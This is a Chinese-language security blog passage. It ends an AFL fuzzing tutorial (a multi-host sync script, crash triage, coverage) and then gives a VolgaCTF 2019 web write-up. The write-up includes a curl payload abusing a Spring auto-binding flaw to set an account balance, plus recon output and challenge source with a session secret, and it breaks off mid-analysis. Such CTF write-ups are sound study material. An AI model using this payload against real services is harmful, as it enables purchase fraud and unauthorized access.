class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># authorized_keys的方式进行ssh认证</span></span><br><span class="line"><span class="comment"># 所有要同步的主机</span></span><br><span class="line">FUZZ_HOSTS=<span class="string">'172.21.5.101 172.21.5.102'</span></span><br><span class="line"><span class="comment"># SSH user</span></span><br><span class="line">FUZZ_USER=root</span><br><span class="line"><span class="comment"># 同步目录</span></span><br><span class="line">SYNC_DIR=<span class="string">'/root/syncdir'</span></span><br><span class="line"><span class="comment"># 同步间隔时间</span></span><br><span class="line">SYNC_INTERVAL=$((30 * 60))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">"<span class="variable">$AFL_ALLOW_TMP</span>"</span> = <span class="string">""</span> ]; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">if</span> [ <span class="string">"<span class="variable">$PWD</span>"</span> = <span class="string">"/tmp"</span> -o <span class="string">"<span class="variable">$PWD</span>"</span> = <span class="string">"/var/tmp"</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"[-] Error: do not use shared /tmp or /var/tmp directories with this script."</span> 1&gt;&amp;2</span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">rm -rf .sync_tmp 2&gt;/dev/null</span><br><span class="line">mkdir .sync_tmp || <span class="built_in">exit</span> 1</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> :; <span class="keyword">do</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 打包所有机器上的数据</span></span><br><span class="line">  <span class="keyword">for</span> host <span class="keyword">in</span> <span class="variable">$FUZZ_HOSTS</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"[*] Retrieving data from <span class="variable">$&#123;host&#125;</span>..."</span></span><br><span class="line">    ssh -o <span class="string">'passwordauthentication no'</span> <span class="variable">$&#123;FUZZ_USER&#125;</span>@<span class="variable">$&#123;host&#125;</span> \</span><br><span class="line">      <span class="string">"cd '<span class="variable">$SYNC_DIR</span>' &amp;&amp; tar -czf - SESSION*"</span> &gt;<span class="string">".sync_tmp/<span class="variable">$&#123;host&#125;</span>.tgz"</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 分发数据</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> dst_host <span class="keyword">in</span> <span class="variable">$FUZZ_HOSTS</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"[*] Distributing data to <span class="variable">$&#123;dst_host&#125;</span>..."</span></span><br><span class="line">    <span class="keyword">for</span> src_host <span class="keyword">in</span> <span class="variable">$FUZZ_HOSTS</span>; <span class="keyword">do</span></span><br><span class="line">      <span class="built_in">test</span> <span class="string">"<span class="variable">$src_host</span>"</span> = <span class="string">"<span class="variable">$dst_host</span>"</span> &amp;&amp; <span class="built_in">continue</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">"    Sending fuzzer data from <span class="variable">$&#123;src_host&#125;</span>..."</span></span><br><span class="line">      ssh -o <span class="string">'passwordauthentication no'</span> <span class="variable">$&#123;FUZZ_USER&#125;</span>@<span class="variable">$dst_host</span> \</span><br><span class="line">        <span class="string">"cd '<span class="variable">$SYNC_DIR</span>' &amp;&amp; tar -xkzf - &amp;&gt;/dev/null"</span> &lt;<span class="string">".sync_tmp/<span class="variable">$&#123;src_host&#125;</span>.tgz"</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"[+] Done. Sleeping for <span class="variable">$SYNC_INTERVAL</span> seconds (Ctrl-C to quit)."</span></span><br><span class="line">  sleep <span class="variable">$SYNC_INTERVAL</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><h2 id="0x02-Fuzz结果分析和代码覆盖率"><a href="#0x02-Fuzz结果分析和代码覆盖率" class="headerlink" title="0x02 Fuzz结果分析和代码覆盖率"></a>0x02 Fuzz结果分析和代码覆盖率</h2><h3 id="1-工作状态"><a href="#1-工作状态" class="headerlink" title="1. 工作状态"></a>1. 工作状态</h3><p>afl-fuzz永远不会停止，所以何时停止测试很多时候就是依靠afl-fuzz提供的状态来决定的。具体的几种方式如下所示:</p><ul><li>状态窗口的<code>cycles done</code>变为绿色;</li><li><code>afl-whatsup</code>查看afl-fuzz状态;</li><li><code>afl-stat</code>得到类似于afl-whatsup的输出结果;</li><li>定制<code>afl-whatsup</code>-&gt;在所有代码外面加个循环就好;</li><li>用<code>afl-plot</code>绘制各种状态指标的直观变化趋势;</li><li><code>pythia</code>估算发现新crash和path概率。</li></ul><h3 id="2-fuzz结束判断"><a href="#2-fuzz结束判断" class="headerlink" title="2. fuzz结束判断"></a>2. fuzz结束判断</h3><ul><li>状态窗口中”cycles done”字段颜色变为绿色该字段的颜色可以作为何时停止测试的参考;</li><li>距上一次发现新路径（或者崩溃）已经过去很长时间了，至于具体多少时间还是需要自己把握;</li><li>目标程序的代码几乎被测试用例完全覆盖，这种情况好像很少见;</li><li>pythia提供的各种数据中，path covera达到99或者correctness的值达到1e-08(含义: 从上次发现path/uniq crash到下一次发现之间大约需要1亿次执行)</li></ul><h3 id="3-输出结果说明"><a href="#3-输出结果说明" class="headerlink" title="3. 输出结果说明"></a>3. 输出结果说明</h3><blockquote><p>queue：存放所有具有独特执行路径的测试用例。</p><p>crashes：导致目标接收致命signal而崩溃的独特测试用例。</p><p>crashes/README.txt：保存了目标执行这些crash文件的命令行参数。</p><p>hangs：导致目标超时的独特测试用例。</p><p>fuzzer_stats：afl-fuzz的运行状态。</p><p>plot_data：用于afl-plot绘图。</p></blockquote><h3 id="4-对crash结果的简单分析和分类"><a href="#4-对crash结果的简单分析和分类" class="headerlink" title="4. 对crash结果的简单分析和分类"></a>4. 对crash结果的简单分析和分类</h3><ol><li>crash exploration mode<br>afl-fuzz的一种运行模式，也称为peruvian rabbit mode，用于确定bug的可利用性，其输入的是crash的信息，之后使用<code>-C</code>启用这种模式，afl会自动探索并创造与之相关的crash来帮助你进行分析，比如判断能够控制某块内存地址的长度。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -m none -C -i ./fuzz_out/crashes -o ./peruvian-were-rabbit_out -- ./vuln -f</span><br></pre></td></tr></table></figure><ol start="2"><li>triage_crashes.sh<br>AFL源码的experimental目录中有一个名为triage_crashes.sh的脚本，可以帮助我们触发收集到的crashes。</li></ol><p>直接使用脚本跟参数的话，我们可以看到相关crash情况的寄存器等信息，但是如果只是大致分类的话，可以使用如下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/root/Desktop/fuzz/afl/experimental/crash_triage/triage_crashes.sh ./fuzz_out ./vuln 2&gt;&amp;1 | grep SIGNAL</span><br></pre></td></tr></table></figure><p>效果如下，11代表了SIGSEGV信号，有可能是因为缓冲区溢出导致进程引用了无效的内存<br><img src="https://i.loli.net/2019/05/15/5cdc199e5ce5630635.png" alt="0C1CB900-EA6C-4814-A67E-1FBE5994AB87.png"></p><ol start="3"><li>crashwalk<br>优点:可以显示更为详细的信息<br>项目地址: <a href="https://github.com/bnagy/crashwalk" target="_blank" rel="noopener">https://github.com/bnagy/crashwalk</a></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 手动模式</span><br><span class="line">~/go/bin/cwtriage -root ./fuzz_out/crashes -match id -- ./vuln -f</span><br><span class="line"># afl自动化模式</span><br><span class="line">~/go/bin/cwtriage -root ./fuzz_out/crashes -afl</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/05/15/5cdc1aa2edc5a77745.png" alt="6DD9C8EA-E494-4633-9F84-3F6B7959CD74.png"></p><ol start="4"><li>afl-collect</li></ol><p>项目地址: <a href="https://github.com/rc0r/afl-utils" target="_blank" rel="noopener">https://github.com/rc0r/afl-utils</a><br>afl-collect基于exploitable来检查crashes的可利用性。它可以自动删除无效的crash样本、删除重复样本以及自动化样本分类。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-collect -j 8 -d crashes.db -e gdb_script ./fuzz_out ./fuzz_in --  ./vuln --target-opts</span><br></pre></td></tr></table></figure><p>效果如下</p><p><img src="https://i.loli.net/2019/05/15/5cdc1abdd38ea24456.png" alt="D9712AE7-55FB-4A82-B974-0D418D4C85D7.png"></p><h3 id="5-代码覆盖率"><a href="#5-代码覆盖率" class="headerlink" title="5. 代码覆盖率"></a>5. 代码覆盖率</h3><p>原理部分参考:<br><a href="https://www.freebuf.com/column/197672.html" target="_blank" rel="noopener">《AFL漏洞挖掘技术漫谈（二）：Fuzz结果分析和代码覆盖率》</a></p><p>afl-cov的使用说明如下:<br>首先使用gcov重新编译源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fprofile-arcs -ftest-coverage vuln.c -o vuln_cov</span><br></pre></td></tr></table></figure><p>如果遇到需要make进行编译的文件，执行如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ make clean</span><br><span class="line">$ ./configure --prefix=/root/tiff-4.0.10/build-cov CC=&quot;gcc&quot; CXX=&quot;g++&quot; CFLAGS=&quot;-fprofile-arcs -ftest-coverage&quot; --disable-shared</span><br><span class="line">$ make</span><br><span class="line">$ make install</span><br></pre></td></tr></table></figure><p>之后使用afl-cov来计算覆盖率</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-cov -d ./fuzz_out --live --enable-branch-coverage -c . -e &quot;cat AFL_FILE | ./vuln_cov AFL_FILE&quot;</span><br></pre></td></tr></table></figure><p>同时进行对插桩过的<code>vuln</code>的fuzz</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i ./fuzz_in -o ./fuzz_out ./vuln -f</span><br></pre></td></tr></table></figure><p>最终效果如下<br><img src="https://i.loli.net/2019/05/15/5cdc1ad66119394310.png" alt="60FD6E10-65F2-4CC1-B270-218F679D59B0.png"></p><p>生成的报告会保存在<code>/path/to/afl-fuzz-output/cov/web/lcov-web-final</code>路径下。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;二进制分析方面主要利用技术包括：动态分析(Dynamic Analysis)、静态分析(Static
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>VolgaCTF 2019 Qualifier Web</title>
    <link href="http://zer0yu.github.io/2019/04/03/VolgaCTF-2019-Qualifier-Web/"/>
    <id>http://zer0yu.github.io/2019/04/03/VolgaCTF-2019-Qualifier-Web/</id>
    <published>2019-04-03T04:59:40.000Z</published>
    <updated>2019-04-03T08:33:22.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>比赛地址: <a href="https://q.2019.volgactf.ru/tasks" target="_blank" rel="noopener">https://q.2019.volgactf.ru/tasks</a></p><p>时间: 星期五, 三月 29, 11:00 PM (23:00) — 星期日, 三月 31, 11:00 PM (23:00)</p><h2 id="0x01-shop"><a href="#0x01-shop" class="headerlink" title="0x01 shop"></a>0x01 shop</h2><ol><li>信息泄露 robots.txt-&gt;shop.1.0.0.war</li><li>此处我直接使用idea自动对代码进行反编译，来对代码进行审计 漏洞主要存在于buy的路由处，在此处使用了spring mvc的<code>@ModelAttribute</code>。它的作用是从modle中获取一个对象，然后使用用户的请求request来赋值，这就造成我们可以对其中的某些变量进行控制。漏洞类型属于自动绑定漏洞。 从user类中我们看到可以控制balance。(PS:自动绑定漏洞是调用set和get方法的并不是直接操控变量或者数据库值)</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Integer <span class="title">getBalance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.balance;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setBalance</span><span class="params">(Integer weight)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.balance = weight;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而从程序的校验来看如果可以控制balance那么就可以满足校验，从而成功购买flag</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(&#123;<span class="string">"/buy"</span>&#125;)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">buy</span><span class="params">(@RequestParam Integer productId, @ModelAttribute(<span class="string">"user"</span>)</span> User user, RedirectAttributes redir, HttpServletRequest request) </span>&#123;</span><br><span class="line">    HttpSession session = request.getSession();</span><br><span class="line">    <span class="keyword">if</span> (session.getAttribute(<span class="string">"user_id"</span>) == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"redirect:index"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Product product = <span class="keyword">this</span>.productDao.geProduct(productId);</span><br><span class="line">        <span class="keyword">if</span> (product != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (product.getPrice() &lt;= user.getBalance()) &#123;</span><br><span class="line">                user.setBalance(user.getBalance() - product.getPrice());</span><br><span class="line">                user.getCartItems().add(product);</span><br><span class="line">                <span class="keyword">this</span>.userDao.update(user);</span><br><span class="line">                redir.addFlashAttribute(<span class="string">"message"</span>, <span class="string">"Successful purchase"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"redirect:profile"</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            redir.addFlashAttribute(<span class="string">"message"</span>, <span class="string">"Not enough money"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            redir.addFlashAttribute(<span class="string">"message"</span>, <span class="string">"Product not found"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"redirect:index"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i http://shop.q.2019.volgactf.ru/buy --cookie &quot;JSESSIONID=9C636630989A68978E11C28CCAABA31F&quot; --data &quot;productId=4&amp;balance=100000&quot; -L</span><br></pre></td></tr></table></figure><p>flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VolgaCTF&#123;c6bc0c68f0d0dac189aa9031f8607dba&#125;</span><br></pre></td></tr></table></figure><h2 id="0x02-HeadHunter"><a href="#0x02-HeadHunter" class="headerlink" title="0x02 HeadHunter"></a>0x02 HeadHunter</h2><h2 id="0x03-Gallery"><a href="#0x03-Gallery" class="headerlink" title="0x03 Gallery"></a>0x03 Gallery</h2><ol><li>进行信息收集 使用dirsearch收集到如下信息</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[22:14:44] 301 -  194B  - /js  -&gt;  http://142.93.204.169/js/</span><br><span class="line">[22:18:24] 403 -    0B  - /api/error_log</span><br><span class="line">[22:18:24] 403 -    0B  - /api/</span><br><span class="line">[22:18:24] 200 -   35B  - /api</span><br><span class="line">[22:18:24] 200 -   35B  - /apibuild.pyc</span><br><span class="line">[22:19:20] 301 -  194B  - /css  -&gt;  http://142.93.204.169/css/</span><br><span class="line">[22:20:09] 301 -  194B  - /js  -&gt;  http://142.93.204.169/js/</span><br><span class="line">[22:20:18] 200 -    3KB - /login</span><br><span class="line">[22:20:18] 200 -    3KB - /login.cgi</span><br><span class="line">[22:20:18] 200 -    3KB - /login.html</span><br><span class="line">[22:20:18] 200 -    3KB - /login.jsp</span><br><span class="line">[22:20:18] 200 -    3KB - /login.js</span><br><span class="line">[22:20:18] 200 -    3KB - /login.php</span><br><span class="line">[22:20:18] 200 -    3KB - /login.pl</span><br><span class="line">[22:20:19] 200 -    3KB - /login.rb</span><br><span class="line">[22:20:19] 200 -    3KB - /login.shtml</span><br><span class="line">[22:20:19] 200 -    3KB - /login.py</span><br><span class="line">[22:20:19] 200 -    3KB - /login.srf</span><br><span class="line">[22:20:19] 200 -    3KB - /login/</span><br><span class="line">[22:20:19] 200 -    3KB - /login/admin/</span><br><span class="line">[22:20:19] 200 -    3KB - /login/cpanel/</span><br><span class="line">[22:20:19] 200 -    3KB - /login/cpanel.js</span><br><span class="line">[22:20:19] 200 -    3KB - /login.htm</span><br><span class="line">[22:20:19] 200 -    3KB - /login/oauth/</span><br><span class="line">[22:20:19] 200 -    3KB - /login_admin.js</span><br><span class="line">[22:20:19] 200 -    3KB - /login_admin</span><br><span class="line">[22:20:19] 200 -    3KB - /logins.txt</span><br><span class="line">[22:20:20] 200 -    3KB - /login/administrator/</span><br><span class="line">[22:20:43] 200 -  459B  - /package.json</span><br><span class="line">[22:21:18] 301 -  194B  - /sessions  -&gt;  http://142.93.204.169/sessions/</span><br><span class="line">[22:21:18] 200 -  169B  - /sessions/</span><br></pre></td></tr></table></figure><p>查看<code>/js/</code>可以列出当前站点的文件</p><p><img src="https://i.loli.net/2019/04/03/5ca43e6e70334.png" alt="3DE72E1C-10EE-467F-9B32-2FFAA471CBD0.png"></p><p>由以上信息基本可以判断出目标站点是一个node.js开发的站点</p><ol><li>源码分析 首先看一下<code>index.js</code>的源码，首先可以看到是基于express框架开发的,<code>${config.apiPrefix}/login</code>,<code>${config.apiPrefix}/logout</code>, <code>${config.apiPrefix}/flag</code>是实现的三个接口，如果想读flag的话，你的session必须是admin</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express    = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">'express-session'</span>);</span><br><span class="line"><span class="keyword">const</span> store = <span class="built_in">require</span>(<span class="string">'session-file-store'</span>)(session);</span><br><span class="line"><span class="keyword">const</span> proxy = <span class="built_in">require</span>(<span class="string">'http-proxy-middleware'</span>);</span><br><span class="line"><span class="keyword">const</span> parser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">config = <span class="built_in">require</span>(<span class="string">'./config'</span>);</span><br><span class="line">auth = <span class="built_in">require</span>(<span class="string">'./auth'</span>)();</span><br><span class="line">config.session.store = <span class="keyword">new</span> store();</span><br><span class="line"></span><br><span class="line">app.use(parser.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(<span class="string">`<span class="subst">$&#123;config.apiPrefix&#125;</span>/*`</span>, session(config.session));</span><br><span class="line">app.use(<span class="string">`<span class="subst">$&#123;config.apiPrefix&#125;</span>/*`</span>, auth.unless(&#123;<span class="attr">path</span>: config.whitelistPaths&#125;));</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">`<span class="subst">$&#123;config.apiPrefix&#125;</span>/login`</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="comment">/* <span class="doctag">TODO:</span> Implement login*/</span></span><br><span class="line">  res.redirect(<span class="string">'/login'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">`<span class="subst">$&#123;config.apiPrefix&#125;</span>/logout`</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="comment">/* <span class="doctag">TODO:</span> Implement logout */</span></span><br><span class="line">  res.redirect(<span class="string">'/login'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">`<span class="subst">$&#123;config.apiPrefix&#125;</span>/flag`</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(req.session);</span><br><span class="line">  <span class="keyword">if</span>(req.session.name === <span class="string">'admin'</span>)</span><br><span class="line">    res.end(fs.readFileSync(<span class="string">'../../flag'</span>, <span class="string">'utf8'</span>));</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    res.status(<span class="number">403</span>).send();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.use(proxy(config.proxy));</span><br><span class="line">app.listen(config.server.port);</span><br></pre></td></tr></table></figure><p>之后看一下config.js文件的内容，可以知道监听的端口是4000，但是未知强求会转到代理端口5000，所以在这儿是可以列目录来读取源代码的。里面还写到了session的签名，以及白名单路由。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">  apiPrefix: <span class="string">'/api'</span>,</span><br><span class="line">  server: &#123;</span><br><span class="line">    port: <span class="number">4000</span></span><br><span class="line">  &#125;,</span><br><span class="line">  proxy: &#123;</span><br><span class="line">    target: <span class="string">'http://localhost:5000'</span>,</span><br><span class="line">    autoRewrite: <span class="literal">true</span></span><br><span class="line">  &#125;,</span><br><span class="line">  session: &#123;</span><br><span class="line">    name: <span class="string">'SESSION'</span>,</span><br><span class="line">    saveUninitialized: <span class="literal">false</span>,</span><br><span class="line">    secret: <span class="string">';GmU1FSlVETF/vzEaBHP'</span>,</span><br><span class="line">    rolling: <span class="literal">true</span>,</span><br><span class="line">    resave: <span class="literal">false</span></span><br><span class="line">  &#125;,</span><br><span class="line">  whitelistPaths: [</span><br><span class="line">    <span class="string">'/api/login'</span>, <span class="string">'/api/logout'</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = config;</span><br></pre></td></tr></table></figure><p>之前还扫描到了session路径，可见session应该是存储在文件中的。而main.js中又有可以请求文件的方法，所以可能我们可以利用这个点来读与一些文件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  year = <span class="built_in">parseInt</span>(location.pathname.slice(<span class="number">1</span>)) || <span class="number">2018</span>;</span><br><span class="line">  $.getJSON(<span class="string">`/api/images?year=<span class="subst">$&#123;year&#125;</span>`</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    $.each(data, <span class="function"><span class="keyword">function</span>(<span class="params">key, img</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">      $(<span class="string">'&lt;div&gt;'</span>, &#123;</span><br><span class="line">          class: 'col-lg-3 col-md-4 col-xs-6',</span><br><span class="line">          html: $(<span class="string">'&lt;a&gt;'</span>, &#123;</span><br><span class="line">            href: <span class="string">`/api/image?year=<span class="subst">$&#123;year&#125;</span>&amp;img=<span class="subst">$&#123;img&#125;</span>`</span>,</span><br><span class="line">            class: 'd-block mb-4 h-100',</span><br><span class="line">            html: $(<span class="string">'&lt;img&gt;'</span>, &#123;</span><br><span class="line">              class: 'img-fluid img-thumbnail',</span><br><span class="line">              src: <span class="string">`/api/image?year=<span class="subst">$&#123;year&#125;</span>&amp;img=<span class="subst">$&#123;img&#125;</span>`</span>,</span><br><span class="line">              alt: <span class="string">''</span></span><br><span class="line">            &#125;)</span><br><span class="line">          &#125;)</span><br><span class="line">       &#125;).appendTo($(<span class="string">'#gallery'</span>));;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;).fail(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; location = <span class="string">'/login'</span>;&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>auth.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> unless = <span class="built_in">require</span>(<span class="string">'express-unless'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> auth = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> authm = <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(req.session);</span><br><span class="line">    <span class="keyword">if</span> (!req.session.name) &#123;</span><br><span class="line">      res.status(<span class="number">403</span>).send();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    next();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  authm.unless = unless;</span><br><span class="line">  <span class="keyword">return</span> authm;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = auth;</span><br></pre></td></tr></table></figure><ol><li>tips 在进行下一步测试之前，先提三个tips: (1) Express框架处理路径的时候是不规范的，因此<code>/</code>,<code>//</code>是存在区别的可以用于某些情况下的bypass； 